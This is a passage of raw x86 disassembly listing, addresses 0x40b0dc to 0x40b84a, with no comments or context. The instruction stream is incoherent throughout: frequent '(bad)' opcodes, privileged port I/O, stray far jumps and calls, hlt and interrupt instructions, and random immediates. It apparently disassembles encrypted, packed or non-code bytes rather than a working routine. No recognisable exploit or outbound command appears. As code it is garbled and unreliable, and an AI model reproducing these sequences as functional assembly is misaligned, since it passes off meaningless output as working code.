  40b0dc:	cwde   
  40b0dd:	enter  0x952b,0x65
  40b0e1:	enter  0x8f26,0xe
  40b0e5:	xor    ebx,DWORD PTR [eax]
  40b0e7:	and    ch,BYTE PTR [edx+ebx*1]
  40b0ea:	push   ecx
  40b0eb:	nop
  40b0ec:	inc    esp
  40b0ed:	xchg   ebx,eax
  40b0ee:	call   0xfee46d03
  40b0f3:	xor    BYTE PTR [ebx-0x2b],ch
  40b0f6:	pop    ebp
  40b0f7:	xchg   esi,eax
  40b0f8:	add    cl,BYTE PTR [eax+edi*4]
  40b0fb:	push   ebp
  40b0fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0fd:	cmp    eax,esp
  40b0ff:	fwait
  40b100:	mov    ch,BYTE PTR [ecx-0x4379d017]
  40b106:	adc    esi,ebp
  40b108:	xchg   edi,eax
  40b109:	das    
  40b10a:	aam    0x58
  40b10c:	and    al,0x7f
  40b10e:	sub    cl,BYTE PTR [esi]
  40b110:	push   edx
  40b111:	dec    eax
  40b112:	xchg   ecx,eax
  40b113:	retf   
  40b114:	mov    ch,0xe6
  40b116:	retf   
  40b117:	jge    0x40b175
  40b119:	imul   edi,DWORD PTR [edx+0x2b1d05d2],0xadf46be3
  40b123:	xchg   ecx,eax
  40b124:	daa    
  40b125:	jmp    0xab2b1696
  40b12a:	jb     0x40b0c4
  40b12c:	sub    BYTE PTR [ebx],bh
  40b12e:	fwait
  40b12f:	push   esp
  40b130:	test   BYTE PTR [edx+eax*2],cl
  40b133:	ja     0x40b11c
  40b135:	lods   al,BYTE PTR ds:[esi]
  40b136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b137:	dec    DWORD PTR fs:[edx-0x22]
  40b13b:	imul   ecx,esi,0x21c8d7f
  40b141:	cmp    eax,0x864016ae
  40b146:	mov    ds:0xe0d85516,eax
  40b14b:	int    0x63
  40b14d:	jae    0x40b0fc
  40b14f:	popa   
  40b150:	shl    DWORD PTR [ecx-0x786792f2],cl
  40b156:	fistp  DWORD PTR [ebp-0x34]
  40b159:	fisttp QWORD PTR [edx-0x35]
  40b15c:	mov    bl,dh
  40b15e:	and    ah,BYTE PTR [eax]
  40b160:	pop    ebx
  40b161:	mov    ds:0x7e67afba,eax
  40b166:	fisttp WORD PTR [ecx]
  40b168:	mov    ss,edx
  40b16a:	cmp    eax,0xffc3b53e
  40b16f:	sti    
  40b170:	jmp    0x40b178
  40b172:	add    ebp,esi
  40b174:	sar    DWORD PTR [edx+0xa],1
  40b177:	lock aas 
  40b179:	mov    esi,0x7b763bce
  40b17e:	ss jo  0x40b10f
  40b181:	cs jnp 0x40b198
  40b184:	in     al,0xfe
  40b186:	or     BYTE PTR [eax+0x61a205bf],dh
  40b18c:	sub    BYTE PTR [edx+ebp*2+0x4d7a0b39],dl
  40b193:	out    0x4d,al
  40b195:	lock fnsave [bp-0x70]
  40b19a:	fcom   QWORD PTR [ebx+0x181a94e2]
  40b1a0:	lds    edx,FWORD PTR [esi-0x4ee80893]
  40b1a6:	sahf   
  40b1a7:	mov    edi,DWORD PTR [ebx]
  40b1a9:	mov    ecx,0xf150e71d
  40b1ae:	xchg   ecx,eax
  40b1af:	sub    DWORD PTR [edx-0x76bc7178],ecx
  40b1b5:	js     0x40b168
  40b1b7:	hlt    
  40b1b8:	imul   esp,DWORD PTR [edx-0x6c566b47],0xf58b2616
  40b1c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1c3:	jmp    0x306:0xb96f62db
  40b1ca:	dec    ebx
  40b1cb:	mov    dl,0x48
  40b1cd:	adc    ah,ch
  40b1cf:	mov    bl,0xa
  40b1d1:	mov    cl,0x87
  40b1d3:	out    dx,al
  40b1d4:	xchg   BYTE PTR [ecx+eax*8+0x41],ch
  40b1d8:	and    edx,0x231d6d6d
  40b1de:	out    dx,al
  40b1df:	push   ebx
  40b1e0:	(bad)  
  40b1e2:	enter  0xd819,0xff
  40b1e6:	inc    ecx
  40b1e7:	shl    DWORD PTR [edx-0x5f43ce03],0xe
  40b1ee:	ret    0xeffe
  40b1f1:	rol    BYTE PTR [eax-0x55ed187c],1
  40b1f7:	lods   al,BYTE PTR ds:[esi]
  40b1f8:	or     al,BYTE PTR [esi-0x6c]
  40b1fb:	xchg   esi,eax
  40b1fc:	and    ecx,DWORD PTR [ebp+0x61898683]
  40b202:	ds add cl,bl
  40b205:	repnz xor BYTE PTR [edi+0x41],dh
  40b209:	jecxz  0x40b1be
  40b20b:	push   es
  40b20c:	push   ebp
  40b20d:	pop    es
  40b20e:	hlt    
  40b20f:	inc    edx
  40b210:	pusha  
  40b211:	push   ecx
  40b212:	(bad)  
  40b213:	or     ebx,ebp
  40b215:	inc    eax
  40b216:	pop    esi
  40b217:	je     0x40b1f3
  40b219:	div    ah
  40b21b:	pop    edi
  40b21c:	loopne 0x40b224
  40b21e:	lods   eax,DWORD PTR ds:[esi]
  40b21f:	pop    ebx
  40b220:	retf   0x841e
  40b223:	stc    
  40b224:	retf   0x3ef5
  40b227:	mov    ebx,0xcbd2b0b6
  40b22c:	sahf   
  40b22d:	add    dl,BYTE PTR [ebx]
  40b22f:	test   al,0x53
  40b231:	xor    BYTE PTR [ecx],dl
  40b233:	xor    ecx,DWORD PTR [edi+0x6e]
  40b236:	arpl   WORD PTR [esi],bx
  40b238:	pop    eax
  40b239:	fucom  st(4)
  40b23b:	adc    ebx,DWORD PTR [ecx-0x10]
  40b23e:	int3   
  40b23f:	xchg   esi,eax
  40b240:	test   al,0x73
  40b242:	pop    edi
  40b243:	rol    BYTE PTR [edx+0x38],1
  40b246:	lds    esp,FWORD PTR [eax]
  40b248:	popf   
  40b249:	dec    ebx
  40b24a:	jle    0x40b206
  40b24c:	pop    esp
  40b24d:	clc    
  40b24e:	neg    BYTE PTR [ecx-0x45724fca]
  40b254:	xchg   ecx,eax
  40b255:	(bad)  
  40b256:	cmp    al,0xf
  40b258:	loopne 0x40b2ab
  40b25a:	(bad)  
  40b25b:	xchg   esi,eax
  40b25c:	adc    al,0x5c
  40b25e:	scas   eax,DWORD PTR es:[edi]
  40b25f:	inc    ebp
  40b260:	sbb    al,0xd9
  40b262:	cmp    BYTE PTR [edi-0x6d],0x25
  40b266:	test   DWORD PTR [edi+0x5ebfd250],esi
  40b26c:	cmp    DWORD PTR [eax+0x2fffe866],0xfe262951
  40b276:	jnp    0x40b2e8
  40b278:	leave  
  40b279:	sar    BYTE PTR [ebx-0x1abfb0c6],1
  40b27f:	repnz (bad) 
  40b281:	mov    al,0x75
  40b283:	out    0xd9,al
  40b285:	adc    eax,0x4dd8aacb
  40b28a:	scas   al,BYTE PTR es:[edi]
  40b28b:	hlt    
  40b28c:	leave  
  40b28d:	hlt    
  40b28e:	imul   dl
  40b290:	mov    fs,ebp
  40b292:	xor    DWORD PTR [edi-0x66e3cd7e],ebx
  40b298:	loopne 0x40b2c5
  40b29a:	jecxz  0x40b228
  40b29c:	jmp    0xd8a6:0x3493b923
  40b2a3:	call   0xb264:0x6e873689
  40b2aa:	sbb    esp,edx
  40b2ac:	imul   ebx,DWORD PTR [esi+0x15],0xccf973a9
  40b2b3:	pop    ecx
  40b2b4:	xor    eax,0xcf688947
  40b2b9:	cmp    al,0x82
  40b2bb:	cmp    eax,DWORD PTR [edx+0x6d]
  40b2be:	push   cs
  40b2bf:	mov    al,ds:0x3e4d74cc
  40b2c4:	and    DWORD PTR [ecx-0x1f],ebx
  40b2c7:	push   esi
  40b2c8:	pop    edx
  40b2c9:	ret    
  40b2ca:	div    BYTE PTR [ecx-0x6aea1340]
  40b2d0:	dec    ecx
  40b2d1:	sbb    eax,0x34be40bd
  40b2d6:	add    BYTE PTR [esi],bh
  40b2d8:	lock jmp 0x75e6:0x1bfa2aa7
  40b2e0:	hlt    
  40b2e1:	jle    0x40b307
  40b2e3:	stc    
  40b2e4:	push   edi
  40b2e5:	inc    esi
  40b2e6:	adc    esi,DWORD PTR [ecx+eiz*2-0x49]
  40b2ea:	jne    0x40b314
  40b2ec:	mov    DWORD PTR [esi],edx
  40b2ee:	sbb    al,ah
  40b2f0:	jl     0x40b334
  40b2f2:	sar    BYTE PTR [ebp-0x5f],1
  40b2f5:	inc    eax
  40b2f6:	call   0x90ba:0x5648c00e
  40b2fd:	(bad)  
  40b2fe:	sub    cl,BYTE PTR [ecx+esi*2+0x5050e19f]
  40b305:	in     al,dx
  40b306:	aaa    
  40b307:	mov    esi,DWORD PTR [ecx-0x56]
  40b30a:	shl    BYTE PTR [edi-0x32e38a4c],cl
  40b310:	fcomi  st,st(7)
  40b312:	mov    bl,0x29
  40b314:	dec    edx
  40b315:	mov    edx,0x395f27d7
  40b31a:	push   ebx
  40b31b:	int3   
  40b31c:	cwde   
  40b31d:	in     eax,dx
  40b31e:	mov    edi,0xe8546ec6
  40b323:	jns    0x40b33c
  40b325:	jecxz  0x40b30d
  40b327:	data16 jns 0x40b2b9
  40b32a:	aas    
  40b32b:	jp     0x40b300
  40b32d:	clc    
  40b32e:	mov    esi,0xe772257b
  40b333:	push   cs
  40b334:	jp     0x40b35c
  40b336:	sar    DWORD PTR [edx+0x1a054190],1
  40b33c:	cld    
  40b33d:	jmp    0x40b3ac
  40b33f:	mov    esi,0x2e92082c
  40b344:	out    0x1e,eax
  40b346:	nop
  40b347:	pop    ss
  40b348:	push   esi
  40b349:	dec    eax
  40b34a:	dec    esp
  40b34b:	les    eax,FWORD PTR [esi+edi*2-0x23d00c38]
  40b352:	adc    eax,0xca6370f8
  40b357:	mov    eax,0xbe2124c0
  40b35c:	or     BYTE PTR [ebp+edx*8+0x32],bl
  40b360:	cmp    al,0x4c
  40b362:	cmp    eax,0x5329f9eb
  40b367:	adc    DWORD PTR ds:[edi],ebx
  40b36a:	loope  0x40b376
  40b36c:	cmp    dh,dl
  40b36e:	(bad)  
  40b370:	inc    ebp
  40b371:	mov    bl,0xa3
  40b373:	or     ch,BYTE PTR [edx+0x51]
  40b376:	xlat   BYTE PTR ds:[ebx]
  40b377:	xor    DWORD PTR [ebx],esi
  40b379:	add    al,0x55
  40b37b:	retf   0x4c01
  40b37e:	stos   BYTE PTR es:[edi],al
  40b37f:	clc    
  40b380:	mov    eax,ds:0xf3cf34b2
  40b385:	aas    
  40b386:	mov    ebp,0x72882f2f
  40b38b:	idiv   edi
  40b38d:	sub    DWORD PTR [edx],eax
  40b38f:	mov    al,0xd8
  40b391:	dec    ebp
  40b392:	cs repz and al,0x2
  40b396:	int3   
  40b397:	cmc    
  40b398:	imul   esi,edi,0xffffffe1
  40b39b:	xor    al,BYTE PTR [ebp+0x5d95f0fd]
  40b3a1:	cli    
  40b3a2:	stc    
  40b3a3:	push   es
  40b3a4:	popf   
  40b3a5:	xchg   edx,eax
  40b3a6:	fst    st(5)
  40b3a8:	mov    esi,0x9c975f27
  40b3ad:	add    eax,0x1a54af2c
  40b3b2:	mov    ds:0xbbd94873,al
  40b3b7:	sbb    bh,BYTE PTR [esi+0x1e]
  40b3ba:	and    BYTE PTR [eax],ch
  40b3bc:	stc    
  40b3bd:	mov    cl,0x6c
  40b3bf:	and    eax,0x5bf6dac6
  40b3c4:	adc    BYTE PTR [esi+eax*8-0x43],bh
  40b3c8:	mov    bh,bh
  40b3ca:	inc    esi
  40b3cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3cc:	pop    ebx
  40b3cd:	mov    BYTE PTR [esi-0x62],ch
  40b3d0:	imul   eax,esp,0x977e655d
  40b3d6:	bound  ecx,QWORD PTR ds:0x53ff3a39
  40b3dc:	enter  0xb010,0x5b
  40b3e0:	xor    eax,0x6b895890
  40b3e5:	nop
  40b3e6:	fwait
  40b3e7:	sar    dh,cl
  40b3e9:	jne    0x40b411
  40b3eb:	or     al,0x9a
  40b3ed:	les    ebp,FWORD PTR [ebp-0x63]
  40b3f0:	mov    ebx,0x1632a6f9
  40b3f5:	xor    BYTE PTR [esi+0x7353b524],ch
  40b3fb:	mov    ecx,0x2b49b306
  40b400:	pop    eax
  40b401:	or     cl,BYTE PTR [ecx+0x12]
  40b404:	cdq    
  40b405:	std    
  40b406:	loopne 0x40b425
  40b408:	push   edx
  40b409:	aam    0x6b
  40b40b:	xor    al,0x30
  40b40d:	std    
  40b40e:	mov    al,0x2b
  40b410:	int3   
  40b411:	jmp    0xc8d38aa1
  40b416:	out    0x12,al
  40b418:	and    DWORD PTR [edi-0x3a],edx
  40b41b:	add    dh,BYTE PTR [eax]
  40b41d:	mov    ah,0xde
  40b41f:	lods   al,BYTE PTR ds:[esi]
  40b420:	sbb    DWORD PTR [edi],0xfffffff2
  40b423:	(bad)  
  40b424:	adc    ch,dl
  40b426:	out    0x2,al
  40b428:	pushf  
  40b429:	pop    ss
  40b42a:	stos   DWORD PTR es:[edi],eax
  40b42b:	scas   al,BYTE PTR es:[edi]
  40b42c:	iret   
  40b42d:	dec    ecx
  40b42e:	xor    BYTE PTR [edx],dl
  40b430:	iret   
  40b431:	mov    dl,0xa8
  40b433:	outs   dx,DWORD PTR ds:[esi]
  40b434:	adc    al,0x2c
  40b436:	add    al,0x3e
  40b438:	aaa    
  40b439:	sub    ah,BYTE PTR [eax+eax*2-0x6d]
  40b43d:	cmp    ecx,DWORD PTR [edx-0x4c]
  40b440:	mov    eax,ds:0xe6651719
  40b445:	push   ecx
  40b446:	call   0xb1e3:0xe80d07f6
  40b44d:	fld    TBYTE PTR [edi]
  40b44f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b450:	jnp    0x40b46f
  40b452:	into   
  40b453:	and    eax,DWORD PTR ds:0x37a0b482
  40b459:	mov    ah,cl
  40b45b:	adc    bl,0x14
  40b45e:	adc    BYTE PTR [eax],bl
  40b460:	push   ebp
  40b461:	scas   eax,DWORD PTR es:[edi]
  40b462:	mov    ecx,0xb60dd23
  40b467:	push   esi
  40b468:	int3   
  40b469:	inc    edi
  40b46a:	loopne 0x40b4a3
  40b46c:	(bad)  
  40b46d:	out    0x10,al
  40b46f:	(bad)  
  40b470:	cmp    dl,BYTE PTR [eax]
  40b472:	push   esi
  40b473:	lea    edx,[ecx-0x2e]
  40b476:	rcl    DWORD PTR [ebx+0x2a390424],0xf7
  40b47d:	jo     0x40b454
  40b47f:	adc    eax,esi
  40b481:	and    eax,0xc7c7ccfc
  40b486:	sub    al,0x81
  40b488:	cmp    eax,esi
  40b48a:	in     eax,0x0
  40b48c:	adc    ah,bh
  40b48e:	and    bl,BYTE PTR [ecx-0x47742c1]
  40b494:	mov    bl,0x9c
  40b496:	fsubr  st(6),st
  40b498:	cmp    al,0x39
  40b49a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b49b:	stos   BYTE PTR es:[edi],al
  40b49c:	add    DWORD PTR [esi+0x4badf85],edx
  40b4a2:	pusha  
  40b4a3:	jp     0x40b472
  40b4a5:	ror    DWORD PTR [ebx+0x6ee65bcf],1
  40b4ab:	lods   al,BYTE PTR ds:[esi]
  40b4ac:	lods   eax,DWORD PTR ds:[esi]
  40b4ad:	jl     0x40b51b
  40b4af:	cs sbb esi,edi
  40b4b2:	pushf  
  40b4b3:	sbb    ecx,esi
  40b4b5:	fist   WORD PTR [edi-0x4aea1d33]
  40b4bb:	mov    edi,0x6d9d1cdc
  40b4c0:	sbb    al,BYTE PTR [edi+0x7ecaa0ad]
  40b4c6:	rcr    esi,1
  40b4c8:	call   DWORD PTR [ebp+esi*2+0x3b]
  40b4cc:	addr16 fwait
  40b4ce:	mov    al,ds:0xe690eb1a
  40b4d3:	add    DWORD PTR [edi],eax
  40b4d5:	or     eax,DWORD PTR [edi+0xc]
  40b4d8:	in     eax,dx
  40b4d9:	mov    eax,0x63c42752
  40b4de:	xlat   BYTE PTR ds:[ebx]
  40b4df:	pop    ebx
  40b4e0:	cmp    cl,BYTE PTR [ecx+edi*8+0xce37ac6]
  40b4e7:	push   cs
  40b4e8:	fadd   QWORD PTR [edi]
  40b4ea:	xchg   ebp,eax
  40b4eb:	mov    edi,DWORD PTR [eax+eax*8+0x17]
  40b4ef:	mov    eax,0xf9084a95
  40b4f4:	retf   0x6358
  40b4f7:	test   DWORD PTR [ecx-0x7],esp
  40b4fa:	mov    al,0xd
  40b4fc:	adc    esi,ecx
  40b4fe:	mov    bh,0xa6
  40b500:	ja     0x40b487
  40b502:	inc    esp
  40b503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b504:	xor    ebp,ebp
  40b506:	out    0x69,eax
  40b508:	in     eax,dx
  40b509:	fdivr  st,st(2)
  40b50b:	ins    BYTE PTR es:[edi],dx
  40b50c:	jb     0x40b4b0
  40b50e:	hlt    
  40b50f:	nop
  40b510:	jge    0x40b508
  40b512:	adc    bh,cl
  40b514:	in     eax,dx
  40b515:	test   DWORD PTR ds:0x77c6319d,esi
  40b51b:	pmullw mm7,QWORD PTR [ecx*4-0x69ae493b]
  40b523:	and    BYTE PTR [edx+0x24],cl
  40b526:	mov    esp,0x69c63a74
  40b52b:	mov    ah,BYTE PTR [ebx+eax*4-0x30]
  40b52f:	cmp    BYTE PTR [eax-0x56bdc2bd],dl
  40b535:	pop    eax
  40b536:	int3   
  40b537:	xor    bh,bh
  40b539:	mov    edx,0x276f8b23
  40b53e:	jle    0x40b4ed
  40b540:	inc    eax
  40b541:	les    ebp,FWORD PTR [ebp+0x36ef8092]
  40b547:	mov    dh,0x30
  40b549:	inc    esi
  40b54a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b54b:	cmp    BYTE PTR [eax],dh
  40b54d:	imul   esi,DWORD PTR [edx+ebp*2-0x63],0x98f1aedf
  40b555:	test   esp,eax
  40b557:	jbe    0x40b579
  40b559:	mov    ch,0x2c
  40b55b:	ins    BYTE PTR es:[edi],dx
  40b55c:	adc    bl,ah
  40b55e:	sar    BYTE PTR [esi-0x73],cl
  40b561:	xor    eax,0x6ba13cbc
  40b566:	xor    eax,0xf75e2b46
  40b56b:	daa    
  40b56c:	adc    ebx,esi
  40b56e:	fwait
  40b56f:	imul   esi,DWORD PTR [eax],0x1ecc5486
  40b575:	and    eax,0xf4d81524
  40b57a:	js     0x40b5fb
  40b57c:	aas    
  40b57d:	mov    WORD PTR [ebp-0x50],ds
  40b580:	inc    ebx
  40b581:	push   cs
  40b582:	call   0x2ea3:0xdc2731e1
  40b589:	push   edx
  40b58a:	push   esi
  40b58b:	(bad)  
  40b58c:	in     al,0x7e
  40b58e:	pop    ss
  40b58f:	cs mov edi,0x412a1e63
  40b595:	fidiv  DWORD PTR [ecx]
  40b597:	mov    WORD PTR [ebx+0x2],ss
  40b59a:	or     esp,DWORD PTR [esi+0x52]
  40b59d:	out    dx,eax
  40b59e:	xor    BYTE PTR [esi],cl
  40b5a0:	call   0xc3a1e430
  40b5a5:	xor    BYTE PTR [ebp+0x38712235],0x97
  40b5ac:	icebp  
  40b5ad:	and    dl,BYTE PTR ds:0x937faab9
  40b5b3:	cmp    eax,0x9f55e55c
  40b5b8:	jnp    0x40b5b5
  40b5ba:	mov    bh,0x83
  40b5bc:	in     al,0x2c
  40b5be:	inc    edx
  40b5bf:	jmp    0x40b5bc
  40b5c1:	mov    dl,0x9
  40b5c3:	push   0x7
  40b5c5:	loop   0x40b640
  40b5c7:	sbb    dl,0x98
  40b5ca:	sbb    al,BYTE PTR [ebp+0x61c86309]
  40b5d0:	inc    ebp
  40b5d1:	add    BYTE PTR [eax],bh
  40b5d3:	ins    DWORD PTR es:[edi],dx
  40b5d4:	rep outs dx,DWORD PTR ds:[esi]
  40b5d6:	pop    esp
  40b5d7:	retf   
  40b5d8:	add    esp,esi
  40b5da:	arpl   WORD PTR [ebp-0x5d],bx
  40b5dd:	xchg   esi,eax
  40b5de:	dec    BYTE PTR [edx]
  40b5e0:	xor    dh,BYTE PTR ds:0xb5f86cbe
  40b5e6:	pop    esp
  40b5e7:	xor    ebx,ecx
  40b5e9:	sub    ebp,ecx
  40b5eb:	popa   
  40b5ec:	gs mov cs,ebp
  40b5ef:	pop    esp
  40b5f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5f1:	jns    0x40b5c0
  40b5f3:	in     eax,dx
  40b5f4:	sbb    edx,ebx
  40b5f6:	lahf   
  40b5f7:	mov    eax,ds:0x3d296649
  40b5fc:	cld    
  40b5fd:	shr    bh,cl
  40b5ff:	daa    
  40b600:	jmp    0x3129:0x47b4b4f3
  40b607:	mov    ds:0x30cded3e,al
  40b60c:	dec    ecx
  40b60d:	xchg   ecx,eax
  40b60e:	cmp    ah,0x9
  40b611:	pop    ebp
  40b612:	outs   dx,BYTE PTR ds:[esi]
  40b613:	dec    edi
  40b614:	arpl   WORD PTR [ebp-0x6c],cx
  40b617:	dec    eax
  40b618:	scas   al,BYTE PTR es:[edi]
  40b619:	lods   eax,DWORD PTR ds:[esi]
  40b61a:	mov    esp,0xacfb9a6d
  40b61f:	cmp    esp,DWORD PTR [eax]
  40b621:	mov    ebx,0x7c3e165a
  40b626:	xlat   BYTE PTR ds:[ebx]
  40b627:	jb     0x40b64e
  40b629:	inc    ebx
  40b62a:	out    0xf1,al
  40b62c:	and    al,0xf7
  40b62e:	imul   ebp,DWORD PTR [ebp-0x6cf3560c],0xfffffffa
  40b635:	cmp    eax,0xe52b6b50
  40b63a:	ds js  0x40b6a7
  40b63d:	nop
  40b63e:	fidivr WORD PTR [esi-0x6a]
  40b641:	mov    dh,0x53
  40b643:	fmul   QWORD PTR [edi+0x64]
  40b646:	or     BYTE PTR ds:0xe8f0f1aa,bh
  40b64c:	scas   al,BYTE PTR es:[edi]
  40b64d:	sub    esi,DWORD PTR [eax+esi*1-0xd7c1cb3]
  40b654:	je     0x40b6cd
  40b656:	mov    cs,esi
  40b658:	out    dx,eax
  40b659:	fild   QWORD PTR [ecx+0xdc817de]
  40b65f:	xchg   edx,eax
  40b660:	mov    edi,0xaf592b11
  40b665:	xchg   ebx,eax
  40b666:	sub    eax,0xb4af3370
  40b66b:	test   ecx,eax
  40b66d:	ss clc 
  40b66f:	pushf  
  40b670:	into   
  40b671:	add    bh,cl
  40b673:	push   esp
  40b674:	add    ecx,0xb46e01ff
  40b67a:	stos   BYTE PTR es:[edi],al
  40b67b:	cwde   
  40b67c:	fwait
  40b67d:	out    dx,al
  40b67e:	xchg   edi,eax
  40b67f:	cmp    al,0x83
  40b681:	dec    edi
  40b682:	in     eax,0x1d
  40b684:	ja     0x40b64b
  40b686:	loope  0x40b6c5
  40b688:	add    BYTE PTR [ecx-0x76],0x91
  40b68c:	ret    
  40b68d:	sub    ebp,eax
  40b68f:	cmp    ch,BYTE PTR [edi+0x10]
  40b692:	ja     0x40b675
  40b694:	mov    eax,ds:0x2267f3f4
  40b699:	iret   
  40b69a:	xchg   ebx,eax
  40b69b:	cmc    
  40b69c:	data16 es lock fcom st(1)
  40b6a1:	aad    0x96
  40b6a3:	hlt    
  40b6a4:	jl     0x40b678
  40b6a6:	gs js  0x40b664
  40b6a9:	dec    ebp
  40b6aa:	push   ds
  40b6ab:	cmp    edi,edi
  40b6ad:	(bad)
  40b6b0:	outs   dx,DWORD PTR ds:[esi]
  40b6b1:	or     BYTE PTR [edi-0x45322fff],ah
  40b6b7:	out    0x54,eax
  40b6b9:	call   0x4e5708e0
  40b6be:	cld    
  40b6bf:	xchg   esp,eax
  40b6c0:	test   DWORD PTR [esi-0x71],esp
  40b6c3:	xchg   ebp,eax
  40b6c4:	(bad)  
  40b6c5:	out    0xef,eax
  40b6c7:	inc    edx
  40b6c8:	dec    edx
  40b6c9:	add    BYTE PTR [ecx-0x664995c7],0x46
  40b6d0:	push   edi
  40b6d1:	les    ebx,FWORD PTR [edi]
  40b6d3:	imul   edx,DWORD PTR [eax],0x5a
  40b6d6:	add    cl,BYTE PTR [ebp-0xd]
  40b6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6da:	mov    al,0x33
  40b6dc:	mov    dh,0xc9
  40b6de:	hlt    
  40b6df:	nop
  40b6e0:	inc    ebp
  40b6e1:	add    BYTE PTR ds:0xa558b3b8,ah
  40b6e7:	scas   al,BYTE PTR es:[edi]
  40b6e8:	inc    edi
  40b6e9:	xlat   BYTE PTR ds:[ebx]
  40b6ea:	out    0xaa,al
  40b6ec:	ja     0x40b718
  40b6ee:	bound  ebp,QWORD PTR [eax+0x2a6db459]
  40b6f4:	aad    0x33
  40b6f6:	cmp    eax,0xfc278572
  40b6fb:	jge    0x40b77a
  40b6fd:	stos   DWORD PTR es:[edi],eax
  40b6fe:	shl    BYTE PTR [edx],0xde
  40b701:	push   ecx
  40b702:	xchg   ecx,eax
  40b703:	dec    esi
  40b704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b705:	xchg   ebp,eax
  40b706:	jl     0x40b74a
  40b708:	sub    ecx,DWORD PTR [ecx-0x9]
  40b70b:	sbb    ah,bh
  40b70d:	xchg   esi,eax
  40b70e:	pushf  
  40b70f:	out    0xab,al
  40b711:	fiadd  WORD PTR [eax-0x686baf03]
  40b717:	pop    ebx
  40b718:	inc    ebp
  40b719:	and    eax,0x161df186
  40b71e:	inc    ebx
  40b71f:	dec    esp
  40b720:	mov    al,0x2a
  40b722:	rol    bh,1
  40b724:	dec    edi
  40b725:	pop    esi
  40b726:	mov    edx,0xe8e6283
  40b72b:	fistp  DWORD PTR [ebx+ebp*1+0x53]
  40b72f:	mov    ch,0x9c
  40b731:	(bad)  
  40b732:	in     eax,dx
  40b733:	mov    DWORD PTR [edx-0x77542d5],edx
  40b739:	jg     0x40b78e
  40b73b:	mov    BYTE PTR [ecx],bh
  40b73d:	test   DWORD PTR [edi],esi
  40b73f:	pop    edx
  40b740:	inc    eax
  40b741:	cs je  0x40b6ec
  40b744:	shl    DWORD PTR [eax],cl
  40b746:	cmp    edi,DWORD PTR [ebx-0x4bb3732f]
  40b74c:	jle    0x40b7b6
  40b74e:	push   es
  40b74f:	sar    ebx,0x93
  40b752:	outs   dx,BYTE PTR ds:[esi]
  40b753:	aas    
  40b754:	popa   
  40b755:	(bad)  
  40b756:	or     eax,0x6d940101
  40b75b:	shl    DWORD PTR [edi+ecx*1-0x3ad1bc68],1
  40b762:	pop    es
  40b763:	lahf   
  40b764:	clc    
  40b765:	clc    
  40b766:	ficomp WORD PTR [ecx]
  40b768:	addr16 adc al,0xd4
  40b76b:	imul   edx,DWORD PTR [eax+0x1d],0x2c
  40b76f:	ficom  WORD PTR [eax]
  40b771:	pop    ss
  40b772:	aas    
  40b773:	add    al,bl
  40b775:	jge    0x40b7f6
  40b777:	mov    eax,0x79d8cbbf
  40b77c:	mov    edx,0x6170aa8a
  40b781:	aad    0x92
  40b783:	in     al,0x69
  40b785:	sahf   
  40b786:	(bad)  
  40b787:	ja     0x40b79e
  40b789:	jns    0x40b794
  40b78b:	pop    ds
  40b78c:	icebp  
  40b78d:	leave  
  40b78e:	test   BYTE PTR [ecx+0x22],0x8a
  40b792:	adc    edi,DWORD PTR [edi+0x75]
  40b795:	xchg   ebx,eax
  40b796:	es jge 0x40b74a
  40b799:	enter  0xd686,0x6a
  40b79d:	adc    cl,ah
  40b79f:	nop
  40b7a0:	stos   DWORD PTR es:[edi],eax
  40b7a1:	xor    dl,BYTE PTR ds:0x586fbcd7
  40b7a7:	adc    esi,DWORD PTR [eax-0x33]
  40b7aa:	inc    ebx
  40b7ab:	mov    ecx,0xd4efc41
  40b7b0:	outs   dx,DWORD PTR ds:[esi]
  40b7b1:	mov    ebx,0xaa2bd59
  40b7b6:	in     al,dx
  40b7b7:	and    DWORD PTR [edx-0x28ced6],edi
  40b7bd:	ret    
  40b7be:	xchg   esi,eax
  40b7bf:	fs cmp eax,0xf43ef19c
  40b7c5:	push   ebp
  40b7c6:	mov    edi,0x30f21d32
  40b7cb:	stc    
  40b7cc:	xor    ebp,DWORD PTR [edi-0x3d]
  40b7cf:	push   0xffffffb2
  40b7d1:	mov    ds:0xeca69460,al
  40b7d6:	mov    al,ds:0x401a75d
  40b7db:	aaa    
  40b7dc:	enterw 0xa3ca,0x32
  40b7e1:	fmul   QWORD PTR [edx-0x51d588a2]
  40b7e7:	imul   ebp,edi,0x8a20fab5
  40b7ed:	pop    ebx
  40b7ee:	pop    edx
  40b7ef:	rcr    BYTE PTR [eax+0x5d645f02],0x34
  40b7f6:	jmp    0xe8d0:0x482e2bf9
  40b7fd:	cld    
  40b7fe:	fdivr  DWORD PTR [edi+0x9f332e5]
  40b804:	outs   dx,BYTE PTR ds:[esi]
  40b805:	xchg   edx,eax
  40b806:	jb     0x40b7e1
  40b808:	mov    al,ds:0x983a9dc5
  40b80d:	(bad)  
  40b80e:	xchg   esp,eax
  40b80f:	add    al,0x5c
  40b811:	addr16 call 0xd43439f0
  40b817:	inc    esp
  40b818:	cmp    cl,dl
  40b81a:	iret   
  40b81b:	popa   
  40b81c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b81d:	push   edi
  40b81e:	aad    0x7c
  40b820:	and    al,0x8b
  40b822:	sar    esp,1
  40b824:	xchg   BYTE PTR [edi+0x59],cl
  40b827:	fst    QWORD PTR [edi+eiz*1+0x77]
  40b82b:	inc    ecx
  40b82c:	inc    esi
  40b82d:	fldl2t 
  40b82f:	add    al,0xfe
  40b831:	inc    esp
  40b832:	push   esi
  40b833:	(bad)  
  40b834:	cmp    eax,0xa1a7d68a
  40b839:	stc    
  40b83a:	loop   0x40b7cb
  40b83c:	or     ch,BYTE PTR [ebp+edx*4+0x64]
  40b840:	fistp  WORD PTR [esi-0x58]
  40b843:	cwde   
  40b844:	push   ss
  40b845:	cmp    al,0x5b
  40b847:	lock adc bl,dh
  40b84a:	pop    esi
